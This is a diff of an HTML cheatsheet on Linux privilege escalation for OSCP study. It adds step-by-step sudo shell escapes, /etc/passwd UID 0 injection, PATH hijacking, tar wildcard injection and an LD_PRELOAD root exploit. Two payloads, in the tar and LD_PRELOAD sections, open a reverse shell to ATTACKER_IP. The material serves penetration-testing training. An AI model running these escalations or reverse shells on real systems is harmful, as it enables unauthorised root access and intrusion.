@@ -125,7 +125,7 @@
     </div>
     <div class="container">
 
-        <h1>Linux Privilege Escalation Cheatsheet (OSCP Style)</h1>
+        <h1>Linux Privilege Escalation</h1>
 
         <!-- 1 -->
         <div class="section">
@@ -157,23 +157,186 @@ env
         </div>
 
         <!-- 2 -->
+
         <div class="section">
-            <div class="section-header">2. SUDO Misconfiguration</div>
+            <div class="section-header">2. SUDO Misconfiguration (Privilege Escalation Core)</div>
             <div class="section-content">
+
+                <h3>Concept</h3>
+
+                <ul>
+                    <li><code>sudo</code> allows executing commands as root</li>
+                    <li>Misconfigurations often allow command abuse or shell escape</li>
+                    <li>This is one of the highest probability escalation vectors in OSCP</li>
+                </ul>
+
+                <h3>Initial Check</h3>
 
                 <pre><code>sudo -l</code></pre>
 
-                <p>Busca comandos ejecutables como root sin contraseña.</p>
+                <p><strong>Always analyze output carefully:</strong></p>
 
-                <p><strong>Ejemplos:</strong></p>
+                <ul>
+                    <li>Commands allowed without password (NOPASSWD)</li>
+                    <li>Wildcard permissions</li>
+                    <li>SETENV / environment preservation</li>
+                    <li>Any binary with root execution rights</li>
+                </ul>
 
-                <pre><code>sudo find . -exec /bin/sh \; -quit
-sudo vim -c ':!/bin/sh'
-sudo less /etc/passwd
-! /bin/sh
+                <h3>High-Risk Patterns</h3>
+
+                <pre><code>(root) NOPASSWD: /usr/bin/vim
+(root) NOPASSWD: /usr/bin/less
+(root) NOPASSWD: /usr/bin/find
+(root) NOPASSWD: /usr/bin/awk
+(root) NOPASSWD: /usr/bin/python
+(root) NOPASSWD: /usr/bin/perl
+(root) NOPASSWD: /usr/bin/tar *</code></pre>
+
+                <h3>Exploitation Strategy</h3>
+
+                <p><strong>Step 1 — Identify binary</strong></p>
+
+                <pre><code>sudo -l</code></pre>
+
+                <p><strong>Step 2 — Check GTFOBins</strong></p>
+
+                <ul>
+                    <li>Search binary in GTFOBins</li>
+                    <li>Check for “sudo” section specifically</li>
+                    <li>Prefer shell escape methods first</li>
+                </ul>
+
+                <p><strong>Step 3 — Exploit pattern</strong></p>
+
+                <h3>Common Exploits</h3>
+
+                <h4>Vim / Vi</h4>
+
+                <pre><code>sudo vim -c ':!/bin/bash'</code></pre>
+
+                <h4>Less / More</h4>
+
+                <pre><code>sudo less /etc/passwd
+!sh</code></pre>
+
+                <h4>Find</h4>
+
+                <pre><code>sudo find . -exec /bin/sh \; -quit</code></pre>
+
+                <h4>Awk</h4>
+
+                <pre><code>sudo awk 'BEGIN {system("/bin/bash")}'</code></pre>
+
+                <h4>Python</h4>
+
+                <pre><code>sudo python3 -c 'import os; os.system("/bin/bash")'</code></pre>
+
+                <h4>Perl</h4>
+
+                <pre><code>sudo perl -e 'exec "/bin/bash";'</code></pre>
+
+                <h3>Advanced Cases</h3>
+
+                <ul>
+                    <li><strong>Wildcard sudo commands</strong> → argument injection</li>
+                    <li><strong>SETENV enabled</strong> → LD_PRELOAD / PYTHONPATH abuse</li>
+                    <li><strong>Scripting binaries</strong> → file write + execution chain</li>
+                </ul>
+
+                <h3>Detection Checklist</h3>
+
+                <ul>
+                    <li>Run <code>sudo -l</code> immediately</li>
+                    <li>Check for NOPASSWD entries</li>
+                    <li>Identify unsafe binaries (vim, less, find, awk, python, tar)</li>
+                    <li>Check for wildcard usage (*)</li>
+                    <li>Check SETENV or env_keep options</li>
+                </ul>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>sudo executes binary as root</li>
+                    <li>Many CLI tools allow shell escape features</li>
+                    <li>Misconfigurations bypass intended restrictions</li>
+                    <li>GTFOBins abuses native functionality, not exploits</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <pre><code>If sudo allows any binary → check GTFOBins before thinking further</code></pre>
+
+                <h3>One-line Rule</h3>
+
+                <pre><code>sudo + unsafe binary = instant root candidate</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">2.5. Process Enumeration (Hidden Privilege Escalation)</div>
+            <div class="section-content">
+
+                <h3>Concept</h3>
+
+                <ul>
+                    <li>Running processes often leak credentials, paths, and misconfigurations</li>
+                    <li>Root-owned processes may execute insecure scripts or services</li>
+                    <li>Local services (127.0.0.1) can expose hidden attack surfaces</li>
+                </ul>
+
+                <h3>Process Recon</h3>
+
+                <pre><code>ps aux
+ps -ef
+ps auxww
 </code></pre>
 
-                <p>Consulta GTFOBins para abusar del binario permitido.</p>
+                <h3>What to Look For</h3>
+
+                <ul>
+                    <li>Credentials in command-line arguments (DB passwords, API keys, tokens)</li>
+                    <li>Root processes running scripts from /tmp, /opt, /home</li>
+                    <li>Custom binaries instead of system binaries</li>
+                    <li>Services listening on localhost only (127.0.0.1)</li>
+                    <li>Long-running processes behaving like hidden cron jobs</li>
+                </ul>
+
+                <h3>High-Value Filters</h3>
+
+                <pre><code>ps aux | grep root
+ps aux | grep -E "python|bash|sh|perl|php"
+ps aux | grep -i password
+ps auxww | grep -v "\["</code></pre>
+
+                <h3>Key Indicators of Misconfiguration</h3>
+
+                <ul>
+                    <li>Root executing scripts in writable directories</li>
+                    <li>Processes launched with full credentials in args</li>
+                    <li>Internal services not exposed externally</li>
+                    <li>Unknown binaries running as root</li>
+                </ul>
+
+                <h3>Example Red Flags</h3>
+
+                <pre><code>root  /usr/bin/python /opt/app/app.py --db-pass=admin123
+root  /tmp/backup.sh
+root  /home/user/service --token=abcd1234</code></pre>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>Process arguments are visible to all users</li>
+                    <li>Misconfigured services expose sensitive data</li>
+                    <li>Root processes often trust local environment</li>
+                    <li>Internal services may be exploitable via port forwarding</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <pre><code>Root process + non-system binary + exposed args = immediate investigation</code></pre>
 
             </div>
         </div>
@@ -235,7 +398,7 @@ cat /etc/crontab
         </div>
 
         <div class="section">
-            <div class="section-header">11. /etc/passwd Writable → Root Escalation</div>
+            <div class="section-header">6. /etc/passwd Writable → Root Escalation</div>
             <div class="section-content">
 
                 <h3>Concept</h3>
@@ -321,27 +484,106 @@ id
 
         <!-- 6 -->
         <div class="section">
-            <div class="section-header">6. Writable Files & Misconfigured Permissions</div>
+            <div class="section-header">7. Writable Files & Misconfigured Permissions</div>
             <div class="section-content">
+
+                <h3>Concept</h3>
+
+                <ul>
+                    <li>Misconfigured file permissions can allow privilege escalation</li>
+                    <li>Writable system files executed or read by root are high-impact targets</li>
+                    <li>Focus is on files that influence authentication, execution, or scheduled tasks</li>
+                </ul>
+
+                <h3>Initial Recon</h3>
 
                 <pre><code>find / -writable -type d 2>/dev/null
 find / -writable -type f 2>/dev/null
-ls -la /etc/passwd
+find / -perm -222 -type f 2>/dev/null
 </code></pre>
 
-                <p>Si /etc/passwd es escribible:</p>
+                <h3>High-Value Targets (Priority Order)</h3>
 
-                <pre><code>openssl passwd newpass
-echo 'root2:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
-su root2
+                <ol>
+                    <li>/etc/passwd</li>
+                    <li>/etc/shadow (rare but critical)</li>
+                    <li>/etc/sudoers</li>
+                    <li>/etc/crontab and /etc/cron.*</li>
+                    <li>systemd service files (/etc/systemd/system/)</li>
+                    <li>application config files (web apps, backups, scripts)</li>
+                </ol>
+
+                <h3>/etc/passwd Writable Exploitation</h3>
+
+                <h4>Step 1 — Verify permission</h4>
+
+                <pre><code>ls -la /etc/passwd</code></pre>
+
+                <p><strong>Vulnerable example:</strong></p>
+
+                <pre><code>-rw-rw-rw- 1 root root</code></pre>
+
+                <h4>Step 2 — Generate password hash</h4>
+
+                <pre><code>openssl passwd newpass</code></pre>
+
+                <h4>Step 3 — Inject privileged user</h4>
+
+                <pre><code>echo 'pwn:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd</code></pre>
+
+                <p><strong>Critical field:</strong> UID = 0 (root privileges)</p>
+
+                <h4>Step 4 — Switch user</h4>
+
+                <pre><code>su pwn
+Password: newpass
+
+id
 </code></pre>
+
+                <h3>Result</h3>
+
+                <pre><code>uid=0(root) gid=0(root)</code></pre>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>/etc/passwd defines user identity mapping</li>
+                    <li>UID 0 is always treated as root</li>
+                    <li>If writable, attacker can inject privileged accounts</li>
+                    <li>Shadow file is ignored when passwd contains valid hash</li>
+                </ul>
+
+                <h3>When It Works</h3>
+
+                <ul>
+                    <li>/etc/passwd is world-writable or group-writable</li>
+                    <li>No integrity protection (immutable flags absent)</li>
+                    <li>System does not enforce strict auth hardening (rare but lab-common)</li>
+                </ul>
+
+                <h3>When It Fails</h3>
+
+                <ul>
+                    <li>/etc/passwd is read-only (normal case)</li>
+                    <li>Immutable flag set (chattr +i)</li>
+                    <li>Shadow authentication enforced strictly</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <pre><code>Writable /etc/passwd → immediate UID 0 injection attempt</code></pre>
+
+                <h3>One-liner Rule</h3>
+
+                <pre><code>Writable auth file + UID 0 injection = instant root escalation</code></pre>
 
             </div>
         </div>
 
         <!-- 7 -->
         <div class="section">
-            <div class="section-header">7. Kernel Exploits</div>
+            <div class="section-header">8. Kernel Exploits</div>
             <div class="section-content">
 
                 <pre><code>uname -r
@@ -360,7 +602,7 @@ gcc exploit.c -o exploit
 
         <!-- 8 -->
         <div class="section">
-            <div class="section-header">8. Docker / LXD Groups</div>
+            <div class="section-header">9. Docker / LXD Groups</div>
             <div class="section-content">
 
                 <pre><code>id
@@ -383,26 +625,295 @@ lxc exec privesc /bin/sh
             </div>
         </div>
 
+
         <!-- 9 -->
         <div class="section">
-            <div class="section-header">9. PATH Hijacking</div>
+            <div class="section-header">10. PATH Hijacking (Privilege Escalation)</div>
             <div class="section-content">
 
-                <pre><code>echo $PATH</code></pre>
+                <h3>Concept</h3>
 
-                Si un script root usa un comando sin ruta absoluta:
+                <ul>
+                    <li>Linux resolves commands using the <code>$PATH</code> environment variable (left → right)</li>
+                    <li>If a privileged process calls commands without absolute paths, resolution becomes
+                        attacker-influenced</li>
+                    <li>This allows execution of malicious binaries in place of legitimate system commands</li>
+                    <li>Impact escalates to <strong>root execution</strong> if the parent process runs with elevated
+                        privileges</li>
+                </ul>
 
-                <pre><code>echo "/bin/bash" > fakebinary
-chmod +x fakebinary
-export PATH=/tmp:$PATH
+                <h3>When It Works</h3>
+
+                <ul>
+                    <li>Root-owned script, cron job, or service executes commands indirectly</li>
+                    <li>Commands are called without absolute paths (e.g. <code>ls</code>, <code>cp</code>,
+                        <code>tar</code>)
+                    </li>
+                    <li>You can write to a directory that appears early in <code>$PATH</code></li>
+                    <li>Environment is not sanitized (no strict secure_path / env_reset enforcement)</li>
+                </ul>
+
+                <h3>Initial Recon</h3>
+
+                <pre><code>echo $PATH
+env | grep PATH
+ps aux
+crontab -l
+cat /etc/crontab
+ls -lah /etc/cron*
+systemctl list-timers --all
 </code></pre>
+
+                <h3>Find Execution Context</h3>
+
+                <pre><code>grep -R "system\|exec\|popen" /etc 2>/dev/null
+grep -R "bash\|sh" /opt /usr/local 2>/dev/null
+</code></pre>
+
+                <h3>Step 1 — Identify Weak Command Usage</h3>
+
+                <p>Look for scripts like:</p>
+
+                <pre><code>tar czf backup.tar.gz *
+cp /home/user/file /tmp/
+service restart app
+ls /tmp</code></pre>
+
+                <p><strong>Red flag:</strong> commands without full paths like <code>/bin/ls</code></p>
+
+                <h3>Step 2 — Confirm Writable PATH Control</h3>
+
+                <pre><code>find / -writable -type d 2>/dev/null | grep -E "tmp|home|var"
+echo $PATH | tr ":" "\n"
+</code></pre>
+
+                <h3>Step 3 — Create Malicious Binary</h3>
+
+                <pre><code>echo -e '#!/bin/bash\n/bin/bash' > ls
+chmod +x ls</code></pre>
+
+                <p><strong>Tip:</strong> name must match the missing system command exactly</p>
+
+                <h3>Step 4 — Inject PATH Priority</h3>
+
+                <pre><code>export PATH=/tmp:$PATH</code></pre>
+
+                <p>Ensure malicious directory is <strong>first in resolution order</strong></p>
+
+                <h3>Step 5 — Trigger Execution</h3>
+
+                <pre><code>sudo /path/to/script.sh
+# or wait for cron/systemd trigger</code></pre>
+
+                <h3>Result</h3>
+
+                <pre><code>id
+uid=0(root) gid=0(root)</code></pre>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>Shell resolves commands using first match in PATH</li>
+                    <li>Privileged process inherits attacker-influenced environment</li>
+                    <li>Missing absolute paths allow substitution</li>
+                    <li>Root executes attacker-controlled binary transparently</li>
+                </ul>
+
+                <h3>Common Real Targets</h3>
+
+                <ul>
+                    <li>Root cron jobs executing maintenance scripts</li>
+                    <li>Backup scripts in <code>/opt</code> or <code>/usr/local/bin</code></li>
+                    <li>CI/CD or deployment automation scripts</li>
+                    <li>Legacy admin scripts calling system utilities</li>
+                </ul>
+
+                <h3>When It Fails</h3>
+
+                <ul>
+                    <li>Commands use absolute paths (<code>/bin/ls</code>, <code>/usr/bin/cp</code>)</li>
+                    <li><code>secure_path</code> enforced in sudoers</li>
+                    <li><code>env_reset</code> strips PATH modification</li>
+                    <li>No writable directory appears in PATH order</li>
+                </ul>
+
+                <h3>Detection Checklist</h3>
+
+                <ul>
+                    <li>Check cron/systemd execution as root</li>
+                    <li>Inspect scripts for missing absolute paths</li>
+                    <li>Verify PATH order and writable directories</li>
+                    <li>Confirm execution context (sudo / service / cron)</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <pre><code>Root execution + missing absolute path + writable PATH entry = immediate hijack candidate</code></pre>
+
+                <h3>One-liner Rule</h3>
+
+                <pre><code>Command without full path + root context + controllable PATH = privilege escalation</code></pre>
 
             </div>
         </div>
 
+
+        <!-- 11 -->
+        <div class="section">
+            <div class="section-header">11. Wildcard Injection / Filename Argument Injection (Privilege Escalation)
+            </div>
+            <div class="section-content">
+
+                <h3>Concept</h3>
+
+                <ul>
+                    <li>Occurs when a privileged command (usually via sudo) uses <strong>wildcards (*)</strong></li>
+                    <li>The shell expands filenames before execution</li>
+                    <li>Filenames can be interpreted as <strong>command arguments or flags</strong></li>
+                    <li>Can lead to <strong>argument injection → command execution as root</strong></li>
+                </ul>
+
+                <h3>Risk Pattern</h3>
+
+                <pre><code>sudo /usr/bin/tar -czvf /backup/backup.tar.gz *
+sudo zip archive.zip *
+sudo rsync -a * /backup/
+sudo chown root:root *
+sudo chmod 755 *
+</code></pre>
+
+                <p><strong>Key idea:</strong> the wildcard expands into attacker-controlled filenames.</p>
+
+                <h3>How to Identify Valid Exploitation Flags (IMPORTANT)</h3>
+
+                <p><strong>You do NOT guess filenames.</strong> You derive them from the binary behavior.</p>
+
+                <h4>Step 1 — Identify the sink (what matters)</h4>
+
+                <ul>
+                    <li>Does the binary accept arguments starting with <code>-</code> or <code>--</code>?</li>
+                    <li>Does it process files, archives, or external inputs?</li>
+                    <li>Is it executed via sudo/root?</li>
+                </ul>
+
+                <pre><code>sudo -l
+command --help
+man command
+</code></pre>
+
+                <h4>Step 2 — Search only for dangerous keywords</h4>
+
+                <p>Do NOT read the full help. Search only for:</p>
+
+                <pre><code>exec
+command
+file
+from
+script
+remote
+rsh
+rmt
+checkpoint
+to-command
+transform
+</code></pre>
+
+                <p>These keywords usually indicate:
+                    <strong>execution, external input, or argument parsing abuse</strong>
+                </p>
+
+                <h4>Step 3 — Convert flags into filenames</h4>
+
+                <p>If a flag exists, you can turn it into a filename:</p>
+
+                <table>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Filename</th>
+                    </tr>
+                    <tr>
+                        <td>--checkpoint=1</td>
+                        <td>--checkpoint=1</td>
+                    </tr>
+                    <tr>
+                        <td>--checkpoint-action=exec=cmd</td>
+                        <td>--checkpoint-action=exec=cmd</td>
+                    </tr>
+                    <tr>
+                        <td>--files-from=/tmp/x</td>
+                        <td>--files-from=/tmp/x</td>
+                    </tr>
+                    <tr>
+                        <td>--rsh=cmd</td>
+                        <td>--rsh=cmd</td>
+                    </tr>
+                </table>
+
+                <h3>Exploitation Method (General)</h3>
+
+                <ol>
+                    <li>Identify sudo command with wildcard (<code>*</code>)</li>
+                    <li>Analyze binary for dangerous flags</li>
+                    <li>Create filenames matching those flags</li>
+                    <li>Trigger sudo execution</li>
+                </ol>
+
+                <h3>Example (tar abuse via checkpoint)</h3>
+
+                <pre><code># Payload script
+echo '#!/bin/bash' > shell.sh
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' >> shell.sh
+chmod +x shell.sh
+
+# Malicious filenames derived from tar flags
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=bash shell.sh"
+
+# Trigger execution
+sudo tar -czvf /tmp/backup.tar.gz *
+</code></pre>
+
+                <h3>Example (rsync argument injection)</h3>
+
+                <pre><code># Flag discovered from help/man
+# --files-from allows external file input
+
+touch -- "--files-from=/tmp/payload"
+
+sudo rsync -a * /backup/
+</code></pre>
+
+                <h3>Detection Checklist</h3>
+
+                <ul>
+                    <li>Check sudo -l for commands using <code>*</code></li>
+                    <li>Identify binaries executed as root</li>
+                    <li>Search help/man for dangerous flags</li>
+                    <li>Look for execution-related options (exec, command, rsh)</li>
+                    <li>Check if current directory is writable</li>
+                </ul>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>Shell expands wildcard before execution</li>
+                    <li>Filenames become CLI arguments</li>
+                    <li>Binaries interpret arguments as options</li>
+                    <li>Privilege context (sudo) escalates impact to root</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <pre><code>If sudo command contains "*" → analyze for argument injection immediately</code></pre>
+
+                <p><strong>Golden rule:</strong> You don't invent filenames. You extract them from the binary's own
+                    options.</p>
+
+            </div>
+        </div>
         <!-- 10 -->
         <div class="section">
-            <div class="section-header">10. Password Hunting</div>
+            <div class="section-header">12. Password Hunting</div>
             <div class="section-content">
 
                 <pre><code>grep -Ri "password" /home 2>/dev/null
@@ -475,6 +986,193 @@ Copy → chmod 600 → ssh → crack if needed
             </div>
         </div>
 
+        <!-- X -->
+        <div class="section">
+            <div class="section-header">13. SUDO Quick Win Matrix (OSCP High Value Section)</div>
+            <div class="section-content">
+
+                <p><strong>If sudo -l shows allowed binaries, always check these patterns first:</strong></p>
+
+                <table>
+                    <tr>
+                        <th>Binary</th>
+                        <th>Quick Exploit Idea</th>
+                    </tr>
+
+                    <tr>
+                        <td>vim / vi</td>
+                        <td>:!bash</td>
+                    </tr>
+
+                    <tr>
+                        <td>less / more</td>
+                        <td>!sh</td>
+                    </tr>
+
+                    <tr>
+                        <td>find</td>
+                        <td>-exec /bin/sh \;</td>
+                    </tr>
+
+                    <tr>
+                        <td>awk</td>
+                        <td>system("/bin/sh")</td>
+                    </tr>
+
+                    <tr>
+                        <td>python / python3</td>
+                        <td>os.system("/bin/sh")</td>
+                    </tr>
+
+                    <tr>
+                        <td>perl</td>
+                        <td>exec "/bin/sh"</td>
+                    </tr>
+
+                    <tr>
+                        <td>tar / zip / rsync</td>
+                        <td>wildcard / argument injection</td>
+                    </tr>
+
+                </table>
+
+                <h3>OSCP Rule</h3>
+
+                <pre><code>Never analyze sudo binaries manually first → check GTFOBins pattern match first</code></pre>
+
+            </div>
+        </div>
+
+        <!-- LD_PRELOAD -->
+        <div class="section">
+            <div class="section-header">14. LD_PRELOAD Escalation (Privilege Escalation)</div>
+            <div class="section-content">
+
+                <h3>Concept</h3>
+
+                <ul>
+                    <li><code>LD_PRELOAD</code> allows loading custom shared libraries before system ones</li>
+                    <li>If preserved in <code>sudo</code>, it can inject code into privileged execution</li>
+                    <li>Leads to execution as <strong>root</strong> if misconfigured</li>
+                </ul>
+
+                <h3>Requirements</h3>
+
+                <ul>
+                    <li><code>sudo -l</code> shows <code>SETENV</code> or <code>env_keep+=LD_PRELOAD</code></li>
+                    <li>Binary is dynamically linked</li>
+                    <li>Environment variables are not sanitized</li>
+                </ul>
+
+                <pre><code>sudo -l</code></pre>
+
+                <p>Look for:</p>
+
+                <pre><code>env_keep+=LD_PRELOAD
+SETENV</code></pre>
+
+                <h3>Exploitation Method</h3>
+
+                <h4>Step 1 — Create malicious library</h4>
+
+                <pre><code>// shell.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}</code></pre>
+
+                <h4>Step 2 — Compile shared object</h4>
+
+                <pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></pre>
+
+                <h4>Step 3 — Execute with sudo</h4>
+
+                <pre><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<binary></code></pre>
+
+                <h3>Example</h3>
+
+                <pre><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/apache2</code></pre>
+
+                <h3>Reverse Shell Variant</h3>
+
+                <pre><code>// shell.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
+}</code></pre>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>LD_PRELOAD forces loading attacker-controlled library</li>
+                    <li>_init() executes automatically on load</li>
+                    <li>sudo preserves environment variables in misconfigured setups</li>
+                    <li>Code runs inside privileged (root) context</li>
+                </ul>
+
+                <h3>When It Works</h3>
+
+                <ul>
+                    <li>sudo allows environment variables</li>
+                    <li>SETENV is enabled</li>
+                    <li>Binary is dynamically linked</li>
+                    <li>No secure_path restriction blocking LD_* variables</li>
+                </ul>
+
+                <h3>When It Fails</h3>
+
+                <ul>
+                    <li>env_reset enabled in sudo</li>
+                    <li>secure_path strips environment variables</li>
+                    <li>Binary is static</li>
+                    <li>LD_PRELOAD is explicitly blocked</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <pre><code>If sudo preserves environment variables → LD_PRELOAD is a high-value escalation path</code></pre>
+
+            </div>
+        </div>
+
+
+        <div class="section">
+            <div class="section-header">15. Writable File Escalation Priority List</div>
+            <div class="section-content">
+
+                <p><strong>Not all writable files are equal. Check in this order:</strong></p>
+
+                <ol>
+                    <li>/etc/sudoers (critical)</li>
+                    <li>/etc/passwd</li>
+                    <li>cron scripts (/etc/cron*, user crontab)</li>
+                    <li>.bashrc / .profile</li>
+                    <li>systemd service files</li>
+                    <li>web config files (wp-config.php, config.php)</li>
+                </ol>
+
+                <h3>High Value Targets</h3>
+
+                <pre><code>
+/etc/crontab
+/etc/cron.d/*
+/etc/systemd/system/*
+~/.bashrc
+        </code></pre>
+
+                <h3>OSCP Rule</h3>
+
+                <pre><code>If writable + executed by root → instant privesc candidate</code></pre>
+
+            </div>
+        </div>
+
         <!-- SUMMARY -->
         <div class="section">
             <div class="section-header">OSCP Mental Flow</div>
@@ -500,47 +1198,62 @@ Copy → chmod 600 → ssh → crack if needed
 
                 <form class="checklist">
 
-                    <h3>Initial Enumeration</h3>
+                    <h3>0. Initial Enumeration (Context Setup)</h3>
                     <label><input type="checkbox"> Ran id / groups</label><br>
                     <label><input type="checkbox"> Checked kernel version (uname -r)</label><br>
                     <label><input type="checkbox"> Identified OS version</label><br>
-                    <label><input type="checkbox"> Checked running processes</label><br>
+                    <label><input type="checkbox"> Reviewed running processes (ps aux)</label><br>
+                    <label><input type="checkbox"> Checked environment variables (env)</label><br>
 
-                    <h3>Sudo</h3>
+                    <h3>1. Sudo (Highest Priority)</h3>
                     <label><input type="checkbox"> Executed sudo -l</label><br>
+                    <label><input type="checkbox"> Identified NOPASSWD entries</label><br>
                     <label><input type="checkbox"> Checked GTFOBins for allowed binaries</label><br>
+                    <label><input type="checkbox"> Checked wildcard / SETENV / env_keep abuse</label><br>
 
-                    <h3>SUID & Capabilities</h3>
-                    <label><input type="checkbox"> Searched for SUID binaries</label><br>
-                    <label><input type="checkbox"> Checked unusual SUID binaries</label><br>
-                    <label><input type="checkbox"> Enumerated capabilities (getcap)</label><br>
+                    <h3>2. SUID Binaries</h3>
+                    <label><input type="checkbox"> Searched SUID binaries (find / -perm -u=s)</label><br>
+                    <label><input type="checkbox"> Identified unusual or custom SUID binaries</label><br>
+                    <label><input type="checkbox"> Checked GTFOBins for SUID exploits</label><br>
 
-                    <h3>Cron Jobs</h3>
-                    <label><input type="checkbox"> Checked crontab</label><br>
-                    <label><input type="checkbox"> Reviewed /etc/cron*</label><br>
-                    <label><input type="checkbox"> Verified writable cron scripts</label><br>
+                    <h3>3. Capabilities</h3>
+                    <label><input type="checkbox"> Enumerated capabilities (getcap -r /)</label><br>
+                    <label><input type="checkbox"> Identified risky binaries (python, perl, etc.)</label><br>
 
-                    <h3>Writable Files</h3>
+                    <h3>4. Cron Jobs / Scheduled Tasks</h3>
+                    <label><input type="checkbox"> Checked crontab (user & system)</label><br>
+                    <label><input type="checkbox"> Reviewed /etc/crontab and /etc/cron*</label><br>
+                    <label><input type="checkbox"> Identified writable scripts executed by root</label><br>
+
+                    <h3>5. Writable Files / Misconfigurations</h3>
                     <label><input type="checkbox"> Searched writable directories</label><br>
                     <label><input type="checkbox"> Checked /etc/passwd permissions</label><br>
-                    <label><input type="checkbox"> Tested /etc/passwd UID 0 injection (if writable)</label><br>
+                    <label><input type="checkbox"> Checked /etc/sudoers permissions</label><br>
+                    <label><input type="checkbox"> Checked systemd service files</label><br>
 
-                    <h3>Containers & Groups</h3>
-                    <label><input type="checkbox"> Checked docker group</label><br>
-                    <label><input type="checkbox"> Checked lxd group</label><br>
+                    <h3>6. Containers & Special Groups</h3>
+                    <label><input type="checkbox"> Checked group membership (docker, lxd, disk)</label><br>
+                    <label><input type="checkbox"> Verified container escape possibilities</label><br>
 
-                    <h3>PATH & Environment</h3>
-                    <label><input type="checkbox"> Reviewed $PATH</label><br>
-                    <label><input type="checkbox"> Tested PATH hijacking possibility</label><br>
+                    <h3>7. PATH & Environment Hijacking</h3>
+                    <label><input type="checkbox"> Reviewed $PATH order</label><br>
+                    <label><input type="checkbox"> Checked writable PATH directories</label><br>
+                    <label><input type="checkbox"> Checked cron/sudo/service command injection risk</label><br>
 
-                    <h3>Password Hunting</h3>
-                    <label><input type="checkbox"> Grepped for passwords</label><br>
-                    <label><input type="checkbox"> Checked bash history</label><br>
-                    <label><input type="checkbox"> Searched for SSH private keys</label><br>
+                    <h3>8. Credentials & Secrets</h3>
+                    <label><input type="checkbox"> Grepped for passwords in /home and /opt</label><br>
+                    <label><input type="checkbox"> Checked bash history (~/.bash_history)</label><br>
+                    <label><input type="checkbox"> Searched SSH private keys (id_rsa, .pem)</label><br>
+                    <label><input type="checkbox"> Reviewed web config files</label><br>
 
-                    <h3>Final Step</h3>
-                    <label><input type="checkbox"> Checked kernel exploits (last resort)</label><br>
-                    <label><input type="checkbox"> Ran LinPEAS / Manual verification</label><br>
+                    <h3>9. Kernel Exploits (Last Resort)</h3>
+                    <label><input type="checkbox"> Checked kernel version (uname -r)</label><br>
+                    <label><input type="checkbox"> Researched known exploits (searchsploit)</label><br>
+                    <label><input type="checkbox"> Confirmed no other escalation vectors exist</label><br>
+
+                    <h3>10. Validation Tools</h3>
+                    <label><input type="checkbox"> Ran LinPEAS / manual verification</label><br>
+                    <label><input type="checkbox"> Cross-checked findings manually</label><br>
 
                 </form>
 
@@ -615,37 +1328,37 @@ Copy → chmod 600 → ssh → crack if needed
             resultsContainer.classList.remove("collapsed");
         }
         document.querySelectorAll(".sub-title").forEach(title => {
-                        const wrapper = document.createElement("div");
-                        wrapper.classList.add("sub-wrapper");
+            const wrapper = document.createElement("div");
+            wrapper.classList.add("sub-wrapper");
 
-                        const content = document.createElement("div");
-                        content.classList.add("sub-content");
+            const content = document.createElement("div");
+            content.classList.add("sub-content");
 
-                        // meter wrapper en el DOM justo antes del título
-                        title.parentNode.insertBefore(wrapper, title);
+            // meter wrapper en el DOM justo antes del título
+            title.parentNode.insertBefore(wrapper, title);
 
-                        // mover el título dentro del wrapper
-                        wrapper.appendChild(title);
+            // mover el título dentro del wrapper
+            wrapper.appendChild(title);
 
-                        // mover todo hasta el siguiente sub-title o section-header
-                        let next = wrapper.nextSibling;
+            // mover todo hasta el siguiente sub-title o section-header
+            let next = wrapper.nextSibling;
 
-                        while (
-                                next &&
-                                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
-                        ) {
-                                const temp = next.nextSibling;
-                                content.appendChild(next);
-                                next = temp;
-                        }
+            while (
+                next &&
+                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+            ) {
+                const temp = next.nextSibling;
+                content.appendChild(next);
+                next = temp;
+            }
 
-                        wrapper.appendChild(content);
+            wrapper.appendChild(content);
 
-                        // toggle
-                        title.addEventListener("click", () => {
-                                wrapper.classList.toggle("active");
-                        });
-                });
+            // toggle
+            title.addEventListener("click", () => {
+                wrapper.classList.toggle("active");
+            });
+        });
     </script>
 
 </body>
